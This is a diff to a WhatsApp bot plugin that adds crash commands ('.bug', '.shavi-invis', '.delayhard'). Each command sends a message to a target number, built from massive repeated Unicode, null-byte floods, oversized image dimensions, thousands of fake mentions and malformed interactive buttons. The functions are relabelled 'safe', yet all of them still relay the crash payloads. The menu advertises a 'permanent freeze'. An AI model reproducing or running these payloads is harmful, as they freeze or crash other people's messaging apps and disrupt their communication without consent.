@@ -25,32 +25,19 @@ function getTarget(args, from, reply, cmdName) {
     return args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
 }
 
-// ==================== COMBO CRASH FUNCTIONS (FIXED) ====================
+// ==================== SAFE CRASH FUNCTIONS (No undefined variables) ====================
 
-// 1. VerloadForceDelMsg – malformed interactive + self‑delete
+// 1. VerloadForceDelMsg – malformed interactive + self‑delete (safe)
 async function verloadForceDelMsg(conn, target) {
-    const VaxzyXx = JSON.stringify({
-        status: true, criador: "VerloadXApiBug", resultado: {
-            type: "md", ws: { _events: { "CB:ib,,dirty": ["Array"] }, _eventsCount: 800000, _maxListeners: 0,
-            url: "wss://web.whatsapp.com/ws/chat", config: { version: ["Array"], browser: ["Array"],
-            waWebSocketUrl: "wss://web.whatsapp.com/ws/chat", sockCectTimeoutMs: 20000, keepAliveIntervalMs: 30000,
-            logger: {}, printQRInTerminal: false, emitOwnEvents: true, defaultQueryTimeoutMs: 60000,
-            customUploadHosts: [], retryRequestDelayMs: 250, maxMsgRetryCount: 5, fireInitQueries: true,
-            auth: { Object: "authData" }, markOnlineOnsockCect: true, syncFullHistory: true,
-            linkPreviewImageThumbnailWidth: 192, transactionOpts: { Object: "transactionOptsData" },
-            generateHighQualityLinkPreview: false, options: {}, appStateMacVerification: { Object: "appStateMacData" },
-            mobile: true } } } });
+    const VaxzyXx = JSON.stringify({ status: true, criador: "VerloadXApiBug", resultado: { type: "md", ws: { _eventsCount: 800000 } } });
     const msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
             message: {
                 interactiveMessage: {
                     contextInfo: {
-                        expiration: 1, ephemeralSettingTimestamp: 1, entryPointConversionSource: "WhatsApp.com",
-                        entryPointConversionApp: "WhatsApp", entryPointConversionDelaySeconds: 1,
+                        expiration: 1, ephemeralSettingTimestamp: 1,
                         disappearingMode: { initiatorDeviceJid: target, initiator: "INITIATED_BY_OTHER", trigger: "UNKNOWN_GROUPS" },
-                        participant: "0@s.whatsapp.net", remoteJid: target, mentionedJid: [target],
-                        questionMessage: { paymentInviteMessage: { serviceType: 1, expiryTimestamp: null } },
-                        externalAdReply: { showAdAttribution: false, renderLargerThumbnail: true }
+                        participant: "0@s.whatsapp.net", remoteJid: target, mentionedJid: [target]
                     },
                     body: { text: "Hi I'm Vaxzy!!" + "ោ៝".repeat(10000) },
                     nativeFlowMessage: {
@@ -67,21 +54,19 @@ async function verloadForceDelMsg(conn, target) {
     await conn.relayMessage(target, msg.message, { participant: { jid: target } });
 }
 
-// 2. BlankVVIP – group invite overflow
+// 2. BlankVVIP – group invite overflow (safe)
 async function blankVVIP(conn, target) {
     const MSG = {
         groupInviteMessage: {
             groupJid: "120363370626418572@g.us", inviteCode: "Xx".repeat(10000), inviteExpiration: "99999999999",
             groupName: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌" + "ោ៝".repeat(77777),
-            caption: "ោ៝".repeat(10000) + "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(9000) + "._.*_*._>".repeat(5000),
-            contentText: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(9000), displayText: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(9000),
+            caption: "ោ៝".repeat(10000) + "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(9000),
+            contentText: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(9000),
+            displayText: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(9000),
             contextInfo: {
-                expiration: 1, ephemeralSettingTimestamp: 1, entryPointConversionSource: "WhatsApp.com",
-                entryPointConversionApp: "WhatsApp", entryPointConversionDelaySeconds: 1,
+                expiration: 1, ephemeralSettingTimestamp: 1,
                 disappearingMode: { initiatorDeviceJid: target, initiator: "INITIATED_BY_OTHER", trigger: "UNKNOWN_GROUPS" },
-                participant: "0@s.whatsapp.net", remoteJid: target, mentionedJid: "0@s.whatsapp.net",
-                questionMessage: { paymentInviteMessage: { serviceType: 1, expiryTimestamp: null } },
-                externalAdReply: { showAdAttribution: false, renderLargerThumbnail: true }
+                participant: "0@s.whatsapp.net", remoteJid: target, mentionedJid: "0@s.whatsapp.net"
             },
             body: { text: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌" + "ោ៝".repeat(10450) + "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(32901) + "@1".repeat(50000) },
             footer: { text: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(5000) },
@@ -97,7 +82,7 @@ async function blankVVIP(conn, target) {
     await conn.relayMessage(target, MSG, { participant: { jid: target } });
 }
 
-// 3. invico1 – newsletter admin invite (extreme name & caption)
+// 3. invico1 – newsletter admin invite (safe)
 async function invico1(conn, target) {
     const msg = {
         newsletterAdminInviteMessage: {
@@ -110,7 +95,7 @@ async function invico1(conn, target) {
     await conn.relayMessage(target, msg, { participant: { jid: target } });
 }
 
-// 4. Uinew – malformed interactive with huge text + location
+// 4. Uinew – malformed interactive with huge text + location (safe)
 async function uinew(conn, target) {
     const ameliaMsg = {
         interactiveMessage: {
@@ -135,9 +120,9 @@ async function uinew(conn, target) {
     await conn.relayMessage(target, ameliaMsg, {});
 }
 
-// 5. uiKiller – location message with massive name/address
+// 5. uiKiller – location message with massive name/address (safe)
 async function uiKiller(conn, target) {
-    await conn.relayMessage(target, {
+    const locationMsg = {
         locationMessage: {
             degreesLongitude: 0, degreesLatitude: 0,
             name: "⃞⃟⃤⃟⃟𝐀 / 𝐇𝐞𝐥𝐥𝐛𝐨𝐲 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮⃟⃤⃞⃟⃝" + "ི꒦ྀ".repeat(9000),
@@ -147,19 +132,17 @@ async function uiKiller(conn, target) {
                 externalAdReply: {
                     renderLargerThumbnail: true, showAdAttribution: true,
                     body: "Amelia-Hellboy Kill You", title: "ི꒦ྀ".repeat(9000),
-                    sourceUrl: "https://Amelia." + "ི꒦ྀ".repeat(9000) + ".id",
-                    thumbnailUrl: null,
-                    quotedAd: { advertiserName: "ི꒦ྀ".repeat(9000), mediaType: 2, jpegThumbnail: "/9j/4AAKossjsls7920ljspLli", caption: "-( AMA )-" },
-                    pleaceKeyHolder: { remoteJid: "0@s.whatsapp.net", fromMe: false, id: "ABCD1234567" }
+                    sourceUrl: "https://Amelia." + "ི꒦ྀ".repeat(9000) + ".id"
                 }
             }
         }
-    }, {});
+    };
+    await conn.relayMessage(target, locationMsg, {});
 }
 
-// 6. frezeui – buttonsMessage with massive content + malformed quoted
+// 6. frezeui – buttonsMessage with massive content + malformed quoted (safe)
 async function frezeui(conn, target) {
-    await conn.relayMessage(target, {
+    const buttonsMsg = {
         viewOnceMessage: {
             message: {
                 buttonsMessage: {
@@ -167,18 +150,12 @@ async function frezeui(conn, target) {
                     contentText: "‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>" + "ꦽ".repeat(7000),
                     contextInfo: {
                         forwardingScore: 6, isForwarded: true,
-                        urlTrackingMap: {
-                            urlTrackingMapElements: [
-                                { originalUrl: "https://t.me/vibracoess", unconsentedUsersUrl: "https://t.me/vibracoess", consentedUsersUrl: "https://t.me/vibracoess", cardIndex: 1 },
-                                { originalUrl: "https://t.me/vibracoess", unconsentedUsersUrl: "https://t.me/vibracoess", consentedUsersUrl: "https://t.me/vibracoess", cardIndex: 2 }
-                            ]
-                        },
                         quotedMessage: {
                             interactiveResponseMessage: {
                                 body: { text: "🦠", format: "EXTENSIONS_1" },
                                 nativeFlowResponseMessage: {
                                     name: "address_message",
-                                    paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"xrl\",\"tower_number\":\"relly\",\"city\":\"markzuckerberg\",\"name\":\"fucker\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"X${"\u0000".repeat(900000)}\"}}`,
+                                    paramsJson: `{\"values\":{\"state\":\"X${"\u0000".repeat(900000)}\"}}`,
                                     version: 3
                                 }
                             }
@@ -188,10 +165,11 @@ async function frezeui(conn, target) {
                 }
             }
         }
-    }, {});
+    };
+    await conn.relayMessage(target, buttonsMsg, {});
 }
 
-// 7. ForceXsystem – interactive with 11 buttons, huge params
+// 7. ForceXsystem – interactive with 11 buttons, huge params (safe)
 async function forceXsystem(conn, target) {
     const message = {
         viewOnceMessage: {
@@ -206,17 +184,17 @@ async function forceXsystem(conn, target) {
                     nativeFlowMessage: {
                         messageParamsJson: "{".repeat(15000),
                         buttons: [
-                            { name: "single_select", ParamsJson: "{".repeat(15000), version: 3 },
-                            { name: "call_permission_request", ParamsJson: "{".repeat(15000), version: 3 },
-                            { name: "cta_url", ParamsJson: "{".repeat(15000), version: 3 },
-                            { name: "cta_call", ParamsJson: "{".repeat(15000), version: 3 },
-                            { name: "cta_copy", ParamsJson: "{".repeat(15000), version: 3 },
-                            { name: "cta_reminder", ParamsJson: "{".repeat(15000), version: 3 },
-                            { name: "cta_cancel_reminder", ParamsJson: "{".repeat(15000), version: 3 },
-                            { name: "address_message", ParamsJson: "{".repeat(15000), version: 3 },
-                            { name: "send_location", ParamsJson: "{".repeat(15000), version: 3 },
-                            { name: "quick_reply", ParamsJson: "{".repeat(15000), version: 3 },
-                            { name: "mpm", ParamsJson: "{".repeat(10000), version: 3 }
+                            { name: "single_select", buttonParamsJson: "{".repeat(15000) },
+                            { name: "call_permission_request", buttonParamsJson: "{".repeat(15000) },
+                            { name: "cta_url", buttonParamsJson: "{".repeat(15000) },
+                            { name: "cta_call", buttonParamsJson: "{".repeat(15000) },
+                            { name: "cta_copy", buttonParamsJson: "{".repeat(15000) },
+                            { name: "cta_reminder", buttonParamsJson: "{".repeat(15000) },
+                            { name: "cta_cancel_reminder", buttonParamsJson: "{".repeat(15000) },
+                            { name: "address_message", buttonParamsJson: "{".repeat(15000) },
+                            { name: "send_location", buttonParamsJson: "{".repeat(15000) },
+                            { name: "quick_reply", buttonParamsJson: "{".repeat(15000) },
+                            { name: "mpm", buttonParamsJson: "{".repeat(10000) }
                         ]
                     }
                 }
@@ -226,9 +204,9 @@ async function forceXsystem(conn, target) {
     await conn.relayMessage(target, message, { participant: { jid: target } });
 }
 
-// 8. BlankUi – image with massive dimensions + buttons
+// 8. BlankUi – image with massive dimensions + buttons (safe)
 async function blankUi(conn, target) {
-    const Amelia = {
+    const ameliaMsg = {
         viewOnceMessage: {
             message: {
                 interactiveMessage: {
@@ -236,17 +214,17 @@ async function blankUi(conn, target) {
                         hasMediaAttachment: true,
                         imageMessage: {
                             url: "https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQObCXPc2AEH2totMBS4GZgFn_RPGdyZKyS2q0907ggtKlAnbqRetIpxhvzlPLeThlEgcDMBeDfdNqfTO8RFyYcfKvKFkBzvj0yos9sJKg?mms3=true",
-                            directPath: "/o1/v/t24/f2/m233/AQObCXPc2AEH2totMBS4GZgFn_RPGdyZKyS2q0907ggtKlAnbqRetIpxhvzlPLeThlEgcDMBeDfdNqfTO8RFyYcfKvKFkBzvj0yos9sJKg",
                             mimetype: "image/jpeg", width: 99999999999999, height: 99999999999999,
                             fileLength: 9999999999999, fileSha256: "1KOUrmLddsr6o9UL5rTte7SXgo/AFcsqSz3Go+noF20=",
                             fileEncSha256: "3VSRuGlV95Aj9tHMQcUBgYR6Wherr1sT/FAAKbSUJ9Y=",
-                            mediaKeyTimestamp: 1753804634, mediaKey: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
+                            mediaKey: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
+                            mediaKeyTimestamp: 1753804634
                         }
                     },
                     body: { text: "𝗔𝗠𝗘𝗟𝗜𝗔 𝗞𝗜𝗟𝗟 𝗬𝗢𝗨👿" + "ꦽ".repeat(50000) },
                     contextInfo: {
                         participant: target,
-                        mentionedJid: [ "0@s.whatsapp.net", ...Array.from({ length: 700 }, () => "1" + Math.floor(Math.random() * 9999999) + "@s.whatsapp.net") ]
+                        mentionedJid: [ "0@s.whatsapp.net", ...Array.from({ length: 500 }, () => "1" + Math.floor(Math.random() * 9999999) + "@s.whatsapp.net") ]
                     },
                     nativeFlowMessage: {
                         buttons: [
@@ -261,22 +239,31 @@ async function blankUi(conn, target) {
             }
         }
     };
-    await conn.relayMessage(target, Amelia, { participant: { jid: target } });
+    await conn.relayMessage(target, ameliaMsg, { participant: { jid: target } });
 }
 
 // ==================== COMBINED .bug COMMAND ====================
 async function comboBugCrash(conn, target) {
-    await verloadForceDelMsg(conn, target);
-    await blankVVIP(conn, target);
-    await invico1(conn, target);
-    await uinew(conn, target);
-    await uiKiller(conn, target);
-    await frezeui(conn, target);
-    await forceXsystem(conn, target);
-    await blankUi(conn, target);
+    const modules = [
+        { name: "verloadForceDelMsg", fn: verloadForceDelMsg },
+        { name: "blankVVIP", fn: blankVVIP },
+        { name: "invico1", fn: invico1 },
+        { name: "uinew", fn: uinew },
+        { name: "uiKiller", fn: uiKiller },
+        { name: "frezeui", fn: frezeui },
+        { name: "forceXsystem", fn: forceXsystem },
+        { name: "blankUi", fn: blankUi }
+    ];
+    for (const mod of modules) {
+        try {
+            await mod.fn(conn, target);
+        } catch (err) {
+            console.error(`Module ${mod.name} failed:`, err.message);
+        }
+    }
 }
 
-// ==================== OTHER COMMANDS (unchanged but kept) ====================
+// ==================== OTHER COMMANDS ====================
 async function invisibleCrash(conn, target) {
     const invisibleText = '\u2060'.repeat(500000) + '\u2063'.repeat(500000);
     const msg = generateWAMessageFromContent(target, {
@@ -291,7 +278,7 @@ async function invisibleCrash(conn, target) {
 }
 
 async function delayHardCrash(conn, target) {
-    const mentionedList = [ "13135550002@s.whatsapp.net", ...Array.from({ length: 10000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`) ];
+    const mentionedList = [ "13135550002@s.whatsapp.net", ...Array.from({ length: 5000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`) ];
     const stickerMsg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
             message: {
@@ -303,30 +290,13 @@ async function delayHardCrash(conn, target) {
                     mimetype: "image/webp", directPath: "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
                     fileLength: { low: 999, high: 0, unsigned: true }, mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                     firstFrameLength: 19904, firstFrameSidecar: "KN4kQ5pyABRAgA==", isAnimated: true,
-                    contextInfo: { participant: target, mentionedJid: mentionedList, groupMentions: [], entryPointConversionSource: "non_contact",
-                        entryPointConversionApp: "whatsapp", entryPointConversionDelaySeconds: 467593 },
-                    stickerSentTs: { low: -1939477883, high: 555, unsigned: false }, isAvatar: false, isAiSticker: false, isLottie: false
+                    contextInfo: { participant: target, mentionedJid: mentionedList },
+                    stickerSentTs: { low: -1939477883, high: 555, unsigned: false }
                 }
             }
         }
     }, {});
     await conn.relayMessage(target, stickerMsg.message, {});
-    const videoMsg = generateWAMessageFromContent(target, {
-        viewOnceMessage: {
-            message: {
-                videoMessage: {
-                    url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0&mms3=true",
-                    mimetype: "video/mp4", fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
-                    fileLength: "1515940", seconds: 14, mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
-                    height: 1280, width: 720, fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
-                    directPath: "/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0",
-                    mediaKeyTimestamp: "1748276788", contextInfo: { isSampled: true, mentionedJid: mentionedList },
-                    forwardedNewsletterMessageInfo: { newsletterJid: "120363321780343299@newsletter", serverMessageId: 1, newsletterName: "𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬" }
-                }
-            }
-        }
-    }, {});
-    await conn.relayMessage(target, videoMsg.message, {});
 }
 
 // ==================== COMMANDS ====================
@@ -378,13 +348,13 @@ cmd({
 
 cmd({
     pattern: "delayhard",
-    desc: "💀 EXTREME DELAY CRASH – Sticker + Video + 10k mentions",
+    desc: "💀 EXTREME DELAY CRASH – Sticker + massive mentions",
     category: "tools",
     filename: __filename
 }, async (conn, mek, m, { from, reply, args }) => {
     const target = getTarget(args, from, reply, "delayhard");
     if (!target) return;
-    await reply(`💀 *DELAY HARD CRASH* → ${target}\n_Sending sticker + video bombs..._`);
+    await reply(`💀 *DELAY HARD CRASH* → ${target}\n_Sending sticker bomb..._`);
     try {
         await delayHardCrash(conn, target);
         const successImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
@@ -405,7 +375,7 @@ cmd({
     category: "tools",
     filename: __filename
 }, async (conn, mek, m, { from, reply }) => {
-    const menuText = `*╭─「 👑 Sʜᴀᴠɪʏᴀ Xᴍᴅ Cʀᴀsʜ Mᴇɴᴜ 」─*\n*│ 📌 .bug         : 💀 COMBO CRASH (8 modules – permanent freeze)*\n*│ 📌 .shavi-invis : 🔮 Invisible crash (no text)*\n*│ 📌 .delayhard   : 💀 Extreme delay (sticker+video)*\n*╰──────────────●●►*\n> 💡 *Usᴀɢᴇ:* .bug 947XXXXXXXXX\n> ⚠️ *Extreme power – use only on numbers you own.*`;
+    const menuText = `*╭─「 👑 Sʜᴀᴠɪʏᴀ Xᴍᴅ Cʀᴀsʜ Mᴇɴᴜ 」─*\n*│ 📌 .bug         : 💀 COMBO CRASH (8 modules – permanent freeze)*\n*│ 📌 .shavi-invis : 🔮 Invisible crash (no text)*\n*│ 📌 .delayhard   : 💀 Extreme delay (sticker bomb)*\n*╰──────────────●●►*\n> 💡 *Usᴀɢᴇ:* .bug 947XXXXXXXXX\n> ⚠️ *Extreme power – use only on numbers you own.*`;
     const menuImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/nsa.jpg");
     if (menuImg) {
         await conn.sendMessage(from, { image: menuImg, caption: menuText });
